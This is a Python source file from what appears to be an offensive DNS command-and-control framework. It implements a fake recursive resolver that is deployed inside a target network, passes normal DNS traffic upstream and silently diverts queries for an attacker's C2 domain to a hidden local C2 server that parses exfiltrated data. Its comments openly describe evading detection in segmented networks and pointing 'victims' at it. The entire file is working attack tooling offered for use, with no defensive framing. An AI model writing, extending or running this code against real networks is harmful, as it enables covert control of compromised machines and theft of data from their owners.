# c2_frameworks/dns/resolver.py
"""
Optional Fake Recursive Resolver – Internal Network Ops
Deploy inside target networks when you control a jump box or router
Forwards all normal DNS traffic → captures only C2 queries
Perfect for air-gapped, segmented, or high-security environments
Makes your DNS C2 look 100% legitimate from the inside
"""

import socket
import threading
import dns.message
import dns.query
import dns.rdataclass
import dns.rdatatype

from .server import DNSC2Server
from .utils import parse_exfil_query

class DNSFakeResolver:
    def __init__(
        self,
        listen_ip: str = "0.0.0.0",
        listen_port: int = 53,
        upstream: str = "8.8.8.8",
        c2_domain: str = "redteam30days.com",
        c2_server_ip: str = "127.0.0.1"
    ):
        self.upstream = upstream
        self.c2_domain = c2_domain.rstrip(".").lower()
        self.c2_server_ip = c2_server_ip
        
        # Spin up the real C2 server in the background
        self.c2_server = DNSC2Server(domain=self.c2_domain, listen_ip="127.0.0.1", port=5353)
        threading.Thread(target=self.c2_server.run, daemon=True).start()
        
        print(f"[+] Fake Recursive Resolver + C2 Capture Active")
        print(f"[+] Listening       : {listen_ip}:{listen_port}")
        print(f"[+] Upstream DNS    : {upstream}")
        print(f"[+] C2 Domain       : {self.c2_domain}")
        print(f"[+] Internal C2     : 127.0.0.1:5353\n")

    def is_c2_query(self, qname: str) -> bool:
        return qname.lower().endswith("." + self.c2_domain)

    def handle_query(self, data: bytes, addr):
        try:
            q = dns.message.from_wire(data)
            qname = str(q.question[0].name).lower()

            # Intercept C2 traffic
            if self.is_c2_query(qname):
                print(f"[C2] Intercepted → {qname}")
                # Forward to internal C2 server
                response = dns.query.udp(q, "127.0.0.1", port=5353, timeout=5)
                return response.to_wire()

            # Forward everything else upstream
            response = dns.query.udp(q, self.upstream, timeout=10)
            return response.to_wire()

        except Exception as e:
            print(f"[-] Resolver error: {e}")
            return b""

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", 53))
        print(f"[+] Fake resolver online. Point victims here for full C2 capture.\n")

        while True:
            try:
                data, addr = sock.recvfrom(8192)
                response = self.handle_query(data, addr)
                if response:
                    sock.sendto(response, addr)
            except KeyboardInterrupt:
                print("\n[+] Fake resolver stopped.")
                break
            except Exception as e:
                print(f"[-] Socket error: {e}")

# ——— Entry Point ———
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Fake Recursive Resolver with C2 Capture")
    parser.add_argument("--upstream", default="8.8.8.8", help="Real upstream DNS")
    parser.add_argument("--domain", required=True, help="Your C2 domain")
    args = parser.parse_args()

    resolver = DNSFakeResolver(upstream=args.upstream, c2_domain=args.domain)
    resolver.run()